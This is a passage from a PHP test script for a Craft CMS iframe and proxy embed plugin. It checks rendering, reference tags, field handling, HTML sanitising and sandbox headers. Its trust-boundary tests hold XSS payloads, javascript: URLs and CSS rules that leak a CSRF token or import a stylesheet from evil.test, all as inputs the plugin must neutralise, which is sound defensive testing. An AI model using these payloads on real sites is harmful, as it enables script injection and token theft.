    $with = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray(['sandbox' => ['allow-scripts']]));
    $without = (string)$plugin->renderer->renderUrl('https://example.com/', new EmbedOptions());

    return str_contains($with, 'sandbox="allow-scripts"') && !str_contains($without, 'sandbox=')
        ?: 'sandbox handling is wrong';
});

check('a fixed-height embed gets pixels, not a ratio', function() use ($plugin) {
    $html = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray(['mode' => 'fixed', 'height' => 333]));

    return str_contains($html, 'height:333px') && !str_contains($html, 'aspect-ratio')
        ?: 'got ' . substr($html, 0, 300);
});

check('an auto-height embed tells the runtime whether it can read the frame', function() use ($plugin) {
    $html = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray(['mode' => 'auto']));
    $config = Json::decode(html_entity_decode(preg_match('/data-eye="([^"]+)"/', $html, $m) ? $m[1] : '{}'));

    return ($config['auto']['sameOrigin'] ?? null) === false ?: 'got ' . json_encode($config);
});

check('a proxy embed points the frame at this site, not at the target', function() use ($plugin) {
    $plugin->getSettings()->proxyEnabled = true;
    $plugin->getSettings()->allowedHosts = ['example.com'];

    $html = (string)$plugin->renderer->renderUrl('https://example.com/page', EmbedOptions::fromArray(['mode' => 'proxy']));

    return str_contains($html, '/eye/proxy')
        && !str_contains($html, 'src="https://example.com/page"')
        ?: 'got ' . substr($html, 0, 400);
});

check('provider defaults sit under the author’s options, never over them', function() use ($plugin) {
    // Spotify wants a fixed 352px; an author asking for 600 must win.
    $html = (string)$plugin->renderer->renderUrl(
        'https://open.spotify.com/album/abc123',
        EmbedOptions::fromArray(['mode' => 'fixed', 'height' => 600]),
    );

    return str_contains($html, 'height:600px') ?: 'got ' . substr($html, 0, 300);
});

check('an empty URL renders nothing rather than an empty frame', function() use ($plugin) {
    return (string)$plugin->renderer->renderUrl('', new EmbedOptions()) === '';
});

check('the embed code is a reference tag, with and without options', function() use (&$embed) {
    return $embed->getEmbedCode() === "{eye:{$embed->handle}:render}"
        && $embed->getEmbedCode(['loading' => 'click']) === "{eye:{$embed->handle}:render(loading=click)}"
        ?: 'got ' . $embed->getEmbedCode(['loading' => 'click']);
});

// -----------------------------------------------------------------------------
section('Reference tags');

check('Craft’s own parser resolves an Eye reference tag', function() use (&$embed) {
    $parsed = Craft::$app->getElements()->parseRefs("before {eye:{$embed->handle}:render} after");

    return str_contains($parsed, '<iframe') && str_contains($parsed, 'before') && str_contains($parsed, 'after')
        ?: 'got ' . substr($parsed, 0, 300);
});

check('a reference tag can carry per-embed options', function() use (&$embed) {
    $parsed = Craft::$app->getElements()->parseRefs("{eye:{$embed->handle}:render(click)}");

    return str_contains($parsed, 'eye-consent') ?: 'got ' . substr($parsed, 0, 300);
});

check('an unknown handle leaves the tag visible rather than vanishing', function() {
    $parsed = Craft::$app->getElements()->parseRefs('{eye:no-such-embed-anywhere:render}');

    return str_contains($parsed, 'no-such-embed-anywhere') ?: 'the tag disappeared: ' . $parsed;
});

// -----------------------------------------------------------------------------
section('Inline field values');

check('an inline embed renders through the same pipeline', function() {
    $inline = InlineEmbed::fromValue(['url' => 'https://youtu.be/dQw4w9WgXcQ', 'options' => ['mode' => 'fixed', 'height' => 200]]);
    $html = (string)$inline->render();

    return str_contains($html, '<iframe') && str_contains($html, 'height:200px')
        ?: 'got ' . substr($html, 0, 300);
});

check('an inline embed stringifies to its markup', function() {
    $inline = InlineEmbed::fromValue(['url' => 'https://youtu.be/dQw4w9WgXcQ']);

    return str_contains((string)$inline, '<iframe');
});

check('an empty inline embed is empty, and renders nothing', function() {
    $inline = InlineEmbed::fromValue(null);

    return $inline->getIsEmpty() && (string)$inline->render() === '';
});

check('an inline embed round-trips through storage', function() {
    $inline = InlineEmbed::fromValue(['url' => 'https://example.com/', 'options' => ['loading' => 'click']]);
    $stored = Json::encode($inline->forStorage());
    $back = InlineEmbed::fromValue($stored);

    return $back->url === 'https://example.com/' && $back->getOptions()->loading === 'click';
});

// -----------------------------------------------------------------------------
section('Field types');

check('the Embed field normalizes, serializes and round-trips', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeCheckField']);

    $value = $field->normalizeValue(['url' => 'https://youtu.be/dQw4w9WgXcQ', 'options' => ['loading' => 'click']]);

    if (!$value instanceof InlineEmbed) {
        return 'normalizeValue returned ' . get_debug_type($value);
    }

    $serialized = $field->serializeValue($value);
    $back = $field->normalizeValue($serialized);

    return $back->url === 'https://youtu.be/dQw4w9WgXcQ' && $back->getOptions()->loading === 'click'
        ?: 'got ' . var_export($serialized, true);
});

check('an empty Embed field serializes to null, not to an empty object', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeCheckField']);

    return $field->serializeValue($field->normalizeValue(null)) === null
        && $field->isValueEmpty($field->normalizeValue(null), new \craft\elements\Entry());
});

check('the Embed field renders an input', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeCheckField']);
    $view = Craft::$app->getView();
    $view->setTemplateMode(craft\web\View::TEMPLATE_MODE_CP);

    $html = $field->getInputHtml($field->normalizeValue(['url' => 'https://youtu.be/dQw4w9WgXcQ']), new \craft\elements\Entry());

    return str_contains($html, 'data-eye-field')
        && str_contains($html, 'https://youtu.be/dQw4w9WgXcQ')
        && str_contains($html, '[options][mode]')
        ?: 'got ' . substr($html, 0, 300);
});

check('the Embed field renders its settings', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeCheckField']);
    Craft::$app->getView()->setTemplateMode(craft\web\View::TEMPLATE_MODE_CP);

    return str_contains((string)$field->getSettingsHtml(), 'enabledOptions');
});

check('the Embed field indexes its URL and caption for search', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeCheckField']);
    $value = $field->normalizeValue(['url' => 'https://example.com/x', 'options' => ['caption' => 'Findable']]);

    $keywords = $field->getSearchKeywords($value, new \craft\elements\Entry());

    return str_contains($keywords, 'example.com') && str_contains($keywords, 'Findable') ?: 'got ' . $keywords;
});

check('the Embeds relation field points at the Embed element type', function() {
    return \justinholtweb\eye\fields\EmbedsField::elementType() === Embed::class;
});

check('field defaults apply to a new value but never to a stored one', function() {
    $field = new \justinholtweb\eye\fields\EmbedField([
        'handle' => 'eyeCheckField',
        'defaultOptions' => ['loading' => 'click', 'ratio' => '4:3'],
    ]);

    $fresh = $field->normalizeValue(null);
    $stored = $field->normalizeValue(['url' => 'https://example.com/', 'options' => []]);

    return $fresh->getOptions()->loading === 'click' && $stored->getOptions()->loading === 'lazy'
        ?: 'fresh=' . $fresh->getOptions()->loading . ' stored=' . $stored->getOptions()->loading;
});

// -----------------------------------------------------------------------------
section('Twig API');

check('the eye filter handles URLs, handles, elements and inline values alike', function() use (&$embed) {
    $view = Craft::$app->getView();
    $view->setTemplateMode(craft\web\View::TEMPLATE_MODE_SITE);

    $results = [
        'url' => $view->renderString('{{ "https://youtu.be/dQw4w9WgXcQ"|eye }}'),
        'handle' => $view->renderString('{{ handle|eye }}', ['handle' => $embed->handle]),
        'element' => $view->renderString('{{ embed|eye }}', ['embed' => $embed]),
        'unknown' => $view->renderString('{{ "no-such-handle-at-all"|eye }}'),
    ];

    foreach (['url', 'handle', 'element'] as $key) {
        if (!str_contains($results[$key], '<iframe')) {
            return "$key produced no frame";
        }
    }

    return trim($results['unknown']) === '' ?: 'an unknown handle produced output';
});

check('craft.eye exposes the library, the providers and the framability check', function() use (&$embed) {
    $view = Craft::$app->getView();
    $view->setTemplateMode(craft\web\View::TEMPLATE_MODE_SITE);

    $out = $view->renderString(
        '{{ craft.eye.embed(handle).id }}|{{ craft.eye.providers()|length }}|{{ craft.eye.match("https://youtu.be/x1234567").provider.handle }}|{{ craft.eye.embedCode(handle) }}',
        ['handle' => $embed->handle],
    );

    [$id, $providerCount, $provider, $code] = explode('|', $out);

    return (int)$id === $embed->id
        && (int)$providerCount > 20
        && $provider === 'youtube'
        && $code === "{eye:{$embed->handle}:render}"
        ?: "got $out";
});

// -----------------------------------------------------------------------------
section('Proxy transformation');

check('relative URLs become absolute, and in-page anchors stay relative', function() use ($plugin) {
    $html = '<html><head></head><body><a href="/about">a</a><img src="pics/x.png"><a href="#top">t</a></body></html>';
    $result = transform($plugin, $html, 'https://example.com/docs/index.html', new EmbedOptions());

    return str_contains($result, 'https://example.com/about')
        && str_contains($result, 'https://example.com/docs/pics/x.png')
        && str_contains($result, 'href="#top"')
        ?: 'got ' . $result;
});

check('a page’s own base href wins over the URL it was fetched from', function() use ($plugin) {
    $html = '<html><head><base href="https://cdn.example.com/v2/"></head><body><img src="x.png"></body></html>';
    $result = transform($plugin, $html, 'https://example.com/page', new EmbedOptions());

    return str_contains($result, 'https://cdn.example.com/v2/x.png') ?: 'got ' . $result;
});

check('scripts, inline handlers and javascript: links are stripped', function() use ($plugin) {
    $html = '<html><body><script>alert(1)</script><div onclick="alert(2)">x</div><a href="javascript:alert(3)">y</a></body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]));

    return !str_contains($result, 'alert(1)')
        && !str_contains($result, 'onclick')
        && !str_contains($result, 'javascript:')
        ?: 'got ' . $result;
});

check('a meta refresh is always removed, even when scripts are kept', function() use ($plugin) {
    $html = '<html><head><meta http-equiv="refresh" content="0;url=https://elsewhere.example"></head><body>x</body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => false]));

    return !str_contains($result, 'elsewhere.example') ?: 'got ' . $result;
});

check('the extract selector keeps only what it matches', function() use ($plugin) {
    $html = '<html><body><nav>NAVIGATION</nav><main id="content"><p>KEEPER</p></main><footer>FOOTER</footer></body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['extract' => '#content']));

    return str_contains($result, 'KEEPER')
        && !str_contains($result, 'NAVIGATION')
        && !str_contains($result, 'FOOTER')
        ?: 'got ' . $result;
});

check('the remove selector drops what it matches', function() use ($plugin) {
    $html = '<html><body><div class="cookie-banner">BANNER</div><p>KEEPER</p></body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['remove' => '.cookie-banner']));

    return str_contains($result, 'KEEPER') && !str_contains($result, 'BANNER') ?: 'got ' . $result;
});

check('a selector that matches nothing leaves the page alone rather than emptying it', function() use ($plugin) {
    $html = '<html><body><p>KEEPER</p></body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['extract' => '#nothing-here']));

    return str_contains($result, 'KEEPER') ?: 'the page was emptied';
});

check('a malformed selector is ignored rather than fatal', function() use ($plugin) {
    $html = '<html><body><p>KEEPER</p></body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['remove' => '>>> not a selector']));

    return str_contains($result, 'KEEPER');
});

check('proxied links open in a new tab, safely', function() use ($plugin) {
    $html = '<html><body><a href="/x">link</a></body></html>';
    $result = transform($plugin, $html, 'https://example.com/', new EmbedOptions());

    return str_contains($result, 'target="_blank"') && str_contains($result, 'noopener')
        ?: 'got ' . $result;
});

check('url() references inside CSS are made absolute too', function() use ($plugin) {
    $html = '<html><head><style>.a{background:url(bg.png)}</style></head><body>x</body></html>';
    $result = transform($plugin, $html, 'https://example.com/assets/page.html', new EmbedOptions());

    return str_contains($result, 'https://example.com/assets/bg.png') ?: 'got ' . $result;
});

check('an inline fragment is purified and scoped', function() use ($plugin) {
    $html = '<html><body><script>alert(1)</script><p onclick="x()">KEEPER</p></body></html>';
    $result = transformInline($plugin, $html, 'https://example.com/', EmbedOptions::fromArray([
        'stripScripts' => false,
        'injectCss' => 'body { color: red } p { margin: 0 }',
    ]));

    return str_contains($result, 'KEEPER')
        && !str_contains($result, 'alert(1)')
        && !str_contains($result, 'onclick')
        && str_contains($result, 'eye-inline')
        && preg_match('/\.eye-inline-\w+ p\s*\{/', $result) === 1
        ?: 'got ' . substr($result, 0, 500);
});

check('an inline fragment’s body rule is scoped to the wrapper, not the page', function() use ($plugin) {
    $result = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', EmbedOptions::fromArray([
        'injectCss' => 'body { background: red }',
    ]));

    return preg_match('/\.eye-inline-\w+\{ background: red \}|\.eye-inline-\w+\{background: red\}/', $result) === 1
        || preg_match('/\.eye-inline-\w+\s*\{\s*background/', $result) === 1
        ?: 'got ' . substr($result, 0, 300);
});

check('a proxied document keeps a base pointing at the real origin', function() use ($plugin) {
    $result = transform($plugin, '<html><head></head><body>x</body></html>', 'https://example.com/a/b.html', new EmbedOptions());

    return str_contains($result, '<base href="https://example.com/a/b.html">') ?: 'got ' . substr($result, 0, 300);
});

// -----------------------------------------------------------------------------
section('Trust boundaries');

$xss = '<img/src=x/onerror=alert(document.domain)>';

check('a reference tag cannot carry fallback markup', function() use (&$embed, $xss) {
    // Craft's ref-tag pattern allows everything but spaces, `}` and `|`, so this is writable by
    // anyone who can type into rich text.
    $parsed = Craft::$app->getElements()->parseRefs("{eye:{$embed->handle}:render(click,fallback=$xss)}");

    return str_contains($parsed, 'eye-consent') && !str_contains($parsed, 'onerror')
        ?: 'got ' . substr($parsed, 0, 400);
});

check('a reference tag cannot inject CSS, loosen the sandbox or add frame params', function() use (&$embed) {
    $overrides = callPrivate($embed, 'parseRenderCall', ['render(height=500,injectCss=x,sandbox=,allow=camera,params=a=1,fallback=y,posterUrl=https://x/y.jpg)']);

    return $overrides === ['height' => '500'] ?: 'got ' . json_encode($overrides);
});

check('a reference tag cannot turn a framed embed into a server-side fetch', function() use (&$embed) {
    $parsed = Craft::$app->getElements()->parseRefs("{eye:{$embed->handle}:render(inline)}");

    return str_contains($parsed, '<iframe') && !str_contains($parsed, 'eye--inline')
        ?: 'got ' . substr($parsed, 0, 300);
});

check('fallback markup is purified, whoever wrote it', function() use ($plugin, $xss) {
    $html = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray([
        'fallback' => "<p><b>Watch it on the site</b></p>$xss<script>alert(1)</script>",
    ]));

    return str_contains($html, '<b>Watch it on the site</b>') && !str_contains($html, 'onerror') && !str_contains($html, '<script>alert')
        ?: 'got ' . substr($html, 0, 600);
});

check('a URL that is not http(s) renders nothing, inline or from a template', function() use ($plugin) {
    $inline = InlineEmbed::fromValue(['url' => 'javascript:alert(1)']);

    return (string)$plugin->renderer->renderUrl('javascript:alert(1)', new EmbedOptions()) === ''
        && (string)$plugin->renderer->renderUrl('data:text/html,<script>alert(1)</script>', new EmbedOptions()) === ''
        && (string)$inline->render() === ''
        ?: 'a javascript: or data: URL was rendered';
});

check('a width cannot smuggle in other CSS declarations', function() {
    $bad = EmbedOptions::fromArray(['width' => '10px;position:fixed;inset:0']);
    $good = EmbedOptions::fromArray(['width' => 'min(100%, 720px)']);

    return $bad->width === '100%' && $good->width === 'min(100%, 720px)' ?: "got {$bad->width} / {$good->width}";
});

check('a poster URL cannot leave its CSS url()', function() use ($plugin) {
    $script = EmbedOptions::fromArray(['posterUrl' => 'javascript:alert(1)']);
    $html = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray([
        'loading' => 'click',
        'posterUrl' => 'https://example.com/a.jpg);background:url(https://evil.test/x',
    ]));

    return $script->posterUrl === '' && !str_contains($html, ');background') && str_contains($html, '%29%3Bbackground')
        ?: 'got ' . (preg_match('/style="[^"]*"/', $html, $m) ? $m[0] : substr($html, 0, 300));
});

check('the Embed field keeps only the options it lets authors set', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeTrust', 'enabledOptions' => ['caption']]);
    $value = $field->normalizeValueFromRequest([
        'url' => 'https://example.com/',
        'options' => ['caption' => 'Hello', 'fallback' => '<b>x</b>', 'injectCss' => 'body{}', 'mode' => 'inline', 'sandbox' => ''],
    ], null);
    $options = $value->getOptions();

    return $options->caption === 'Hello' && $options->fallback === '' && $options->injectCss === '' && $options->mode !== 'inline'
        ?: 'got ' . json_encode($options->toStorageArray());
});

check('CSS injected into a proxied page cannot close its <style>', function() use ($plugin) {
    $options = EmbedOptions::fromArray(['injectCss' => 'p{color:red}</style><script>alert(1)</script>']);
    $document = transform($plugin, '<html><head></head><body><p>x</p></body></html>', 'https://example.com/', $options);
    $fragment = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', $options);

    return !str_contains($document, '<script>alert') && !str_contains($fragment, '<script>alert') && !str_contains($fragment, '</style><script')
        ?: 'the style element was broken out of';
});

check('a JSON string posted to the Embed field is a URL, not a way round its options', function() {
    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeTrust', 'enabledOptions' => ['caption']]);
    $value = $field->normalizeValueFromRequest(json_encode([
        'url' => 'https://example.com/',
        'options' => ['allow' => 'camera microphone', 'mode' => 'inline', 'injectCss' => 'body{}'],
    ]), null);
    $options = $value->getOptions();

    return $options->mode !== 'inline' && $options->injectCss === '' && !str_contains(json_encode($options->allow), 'camera')
        ?: 'got ' . json_encode($options->toStorageArray());
});

check('inline CSS nested in an at-rule cannot reach the page around it', function() use ($plugin) {
    $options = EmbedOptions::fromArray(['injectCss' => 'p{color:red} @media all{input[name=CRAFT_CSRF_TOKEN][value^=a]{background:url(//evil.test/a)}} @supports (x:y){@media all{a{b:c}}}']);
    $fragment = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', $options);

    return !str_contains($fragment, 'CSRF') && !str_contains($fragment, 'evil.test') && str_contains($fragment, 'p{color:red}')
        ?: 'got ' . substr($fragment, 0, 300);
});

check('an at-keyword spelled with an escape is removed too', function() use ($plugin) {
    $css = '@\69mport url(https://evil.test/x.css); p{color:red}';
    $stored = EmbedOptions::fromArray(['injectCss' => $css])->injectCss;
    $fragment = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', EmbedOptions::fromArray(['injectCss' => $css]));

    return !str_contains($stored, 'evil.test') && !str_contains($fragment, 'evil.test') ?: "stored $stored";
});

check('a payload signed with the bare security key is not a proxy payload', function() {
    $payload = base64_encode(json_encode(['v' => 2, 'url' => 'https://example.com/', 'o' => []]));
    $signed = Craft::$app->getSecurity()->hashData($payload);

    return Plugin::getInstance()->proxyRoutes->verify($signed) === null ?: 'it verified';
});

check('injected CSS cannot @import a stylesheet from elsewhere', function() {
    return !str_contains(EmbedOptions::fromArray(['injectCss' => '@import url(https://evil.test/x.css); p{color:red}'])->injectCss, '@import');
});

check('a stripped proxied page loses every way of running script', function() use ($plugin) {
    $html = '<html><body>'
        . '<iframe src="javascript:alert(1)"></iframe>'
        . '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'
        . '<object data="https://example.com/x.swf"></object><embed src="https://example.com/x.swf">'
        . '<a href=" jAvAsCrIpT:alert(1)">a</a><form action="javascript:alert(1)"></form>'
        . '<a href="data:text/html,<script>alert(1)</script>">d</a>'
        . '<img src="data:image/png;base64,AAAA" alt="kept">'
        . '</body></html>';
    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]));

    return stripos($result, 'javascript:') === false
        && !str_contains($result, 'srcdoc')
        && !str_contains($result, '<object')
        && !str_contains($result, '<embed')
        && !str_contains($result, 'data:text/html')
        && str_contains($result, 'data:image/png')
        ?: 'got ' . substr($result, 0, 600);
});

check('removing a plugin element keeps the content after it', function() use ($plugin) {
    $result = transform($plugin, '<html><body><embed src="https://example.com/x.swf"><p>After the embed</p><object data="x"><p>Object fallback</p></object></body></html>', 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]));

    return str_contains($result, 'After the embed') && str_contains($result, 'Object fallback') && !str_contains($result, '<embed')
        ?: 'got ' . substr($result, 0, 400);
});

check('a proxied page that keeps its scripts reports its own height', function() use ($plugin) {
    $result = transform($plugin, '<html><head></head><body>x</body></html>', 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => false]));
    $html = (string)$plugin->renderer->renderUrl('https://example.com/page', EmbedOptions::fromArray(['mode' => 'proxy', 'stripScripts' => false]));
    $config = Json::decode(html_entity_decode(preg_match('/data-eye="([^"]+)"/', $html, $m) ? $m[1] : '{}'));

    return str_contains($result, "eye: 'height'") && ($config['auto']['sameOrigin'] ?? null) === false
        ?: 'child script ' . (str_contains($result, "eye: 'height'") ? 'present' : 'missing') . ', config ' . json_encode($config['auto'] ?? null);
});

check('a stored embed’s proxy URL changes when its script handling does', function() use ($plugin) {
    $uid = '00000000-0000-0000-0000-000000000001';
    $stripped = $plugin->proxyRoutes->urlFor('https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]), $uid);
    $scripted = $plugin->proxyRoutes->urlFor('https://example.com/', EmbedOptions::fromArray(['stripScripts' => false]), $uid);

    return $stripped !== $scripted && str_contains($stripped, "eye/proxy/$uid") ?: "got $stripped / $scripted";
});

check('a stripped proxied page is served in a sandbox that runs nothing', function() use ($plugin) {
    $stripped = webResponse(fn() => callPrivate(new \justinholtweb\eye\controllers\ProxyController('proxy', $plugin), 'htmlResponse', ['<p>x</p>', EmbedOptions::fromArray(['stripScripts' => true])]));
    $csp = (string)$stripped->getHeaders()->get('Content-Security-Policy');

    return str_contains($csp, 'sandbox ') && !str_contains($csp, 'allow-scripts') && str_contains($csp, "script-src 'none'")
        ?: "got $csp";
});

check('a proxied page that keeps its scripts loses this site’s origin', function() use ($plugin) {
    $scripted = webResponse(fn() => callPrivate(new \justinholtweb\eye\controllers\ProxyController('proxy', $plugin), 'htmlResponse', ['<p>x</p>', EmbedOptions::fromArray(['stripScripts' => false])]));
    $csp = (string)$scripted->getHeaders()->get('Content-Security-Policy');

    return str_contains($csp, 'allow-scripts') && !str_contains($csp, 'allow-same-origin') && str_contains($csp, "frame-ancestors 'self'")
        ?: "got $csp";
});

// -----------------------------------------------------------------------------
section('Settings');

check('a bad host name is rejected with an explanation', function() use ($plugin) {
    $settings = $plugin->getSettings();
    $settings->allowedHosts = ['fine.example', 'not a host!'];
    $settings->validate(['allowedHosts']);

    return $settings->hasErrors('allowedHosts') ?: 'it was accepted';
});

check('editable-table rows are accepted as well as plain strings', function() use ($plugin) {
    $settings = $plugin->getSettings();
    $settings->clearErrors();
    $settings->allowedHosts = [['host' => 'example.com'], 'other.example'];
    $settings->validate(['allowedHosts']);

    return $settings->allowedHosts === ['example.com', 'other.example']
        ?: 'got ' . json_encode($settings->allowedHosts);
});

check('the proxy is only usable when it is on and has somewhere to go', function() use ($plugin) {
    $settings = $plugin->getSettings();

    $settings->proxyEnabled = false;
    $settings->allowedHosts = ['example.com'];
    $off = $settings->getProxyIsUsable();

    $settings->proxyEnabled = true;
    $settings->allowedHosts = [];
    $empty = $settings->getProxyIsUsable();

    $settings->allowedHosts = ['example.com'];
    $ready = $settings->getProxyIsUsable();

    return $off === false && $empty === false && $ready === true;
});

// -----------------------------------------------------------------------------
// Clean up

// Belt and braces: a disabled embed is still found by an explicit `status(null)` query, and
// anything left behind by an earlier run that died mid-way is swept up by handle prefix.
foreach ($created as $id) {
    $element = Embed::find()->id($id)->status(null)->one();

    if ($element) {
        Craft::$app->getElements()->deleteElement($element, true);
    }
}

foreach (Embed::find()->status(null)->all() as $stray) {
    if (preg_match('/^eye-(check|roundtrip|disabled|recycle)-[0-9a-f]{6}$/', (string)$stray->handle)) {
        Craft::$app->getElements()->deleteElement($stray, true);
    }
}

$plugin->getSettings()->setAttributes($originalSettings, false);

echo "\n";
echo $failed === 0
    ? "All $passed checks passed.\n"
    : "$passed passed, $failed FAILED.\n";

exit($failed === 0 ? 0 : 1);

// -----------------------------------------------------------------------------

/** Reaches a private method, so the verdict logic can be tested without a network. */
function callPrivate(object $object, string $method, array $args): mixed
{
    $reflection = new ReflectionMethod($object, $method);
    $reflection->setAccessible(true);

    return $reflection->invokeArgs($object, $args);
}

/** Runs `$build` with a web response in place of the console one, and hands back what it built. */
function webResponse(callable $build): mixed
{
    $console = Craft::$app->get('response');
    Craft::$app->set('response', new craft\web\Response());

    try {
        return $build();
    } finally {
        Craft::$app->set('response', $console);
    }
}

/** Runs the proxy's document transformation over a fixed string, with no network involved. */
function transform(Plugin $plugin, string $html, string $url, EmbedOptions $options): string
{
    return callPrivate($plugin->proxy, 'transform', [$html, $url, $options, false])->html;
}

function transformInline(Plugin $plugin, string $html, string $url, EmbedOptions $options): string
{
    return callPrivate($plugin->proxy, 'transform', [$html, $url, $options, true])->html;
}
